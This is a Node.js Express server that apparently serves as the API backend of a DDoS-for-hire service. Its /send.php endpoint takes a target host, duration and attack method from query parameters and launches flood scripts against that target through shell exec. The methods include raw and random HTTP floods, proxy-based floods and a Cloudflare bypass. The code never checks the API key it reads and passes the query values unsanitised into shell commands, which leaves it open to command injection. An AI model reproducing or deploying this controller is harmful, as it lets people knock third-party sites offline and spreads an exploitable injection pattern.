const express = require("express");
const app = express();
const exec = require("child_process").exec;

var server= app.listen(process.env.PORT);

let cmd_to_exec;

async function send_to_server(req, res, err) {
	if (!req.query.host || !req.query.port || !req.query.time || !req.query.method || !req.query.username) return res.end("Missing fields.");
	
	var target = req.query.host, port = req.query.port, time = req.query.time, method = req.query.method, request_username = req.query.username, request_ipaddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress, request_apikey = req.query.api_key;
	
	if (method == "HTTP-RAW") { cmd_to_exec = `node methods/raw2.js ${target} ${time} ${request_username}`; }
    else if (method == "HTTP-RAND") { cmd_to_exec = `node methods/HTTP-RAND.js ${target} ${time} ${request_username}`; } 
    else if (method == "HTTP-SOCKET") { cmd_to_exec = `node methods/HTTP-SOCKETS.js ${target} 64 ${time} ${request_username}`; }
    else if (method == "HTTP-ZEUS") { cmd_to_exec = `node methods/HTTP-ZEUS.js ${target} 1000 ${time} methods/proxies.txt ${request_username}`; }
    else if (method == "HTTP-BYPASS") { cmd_to_exec = `node methods/httpbypassv2.js ${target} ${time} ${request_username}`; }
    else if (method == "HTTP-BETA") { cmd_to_exec = `node methods/httpfuzz.js ${target} methods/proxies.txt ${time} ${request_username}`; }
    else if (method == "CF-MIX") { cmd_to_exec = `node methods/cf.js ${target} ${time} 1000 ${request_username}`; }
    else if (method == "STOP") { cmd_to_exec = `pkill -f ${request_username}`; }
    
    exec(cmd_to_exec, (err, std, s) => {});
    res.end("true");
}

app.get("/send.php", async (req, res, err) => {
	send_to_server(req, res, err);
});

app.use(function (req, res, err) {
	var request_ipaddres = req.headers['x-forwarded-for'] || req.socket.remoteAddress, request_method = req.method, request_path = req.path;
	console.log(`Client (${request_ipaddres}) sent request to path (${request_path}) with method type (${request_method}).`);
});

console.log(`API Server Running on port 8081.`);
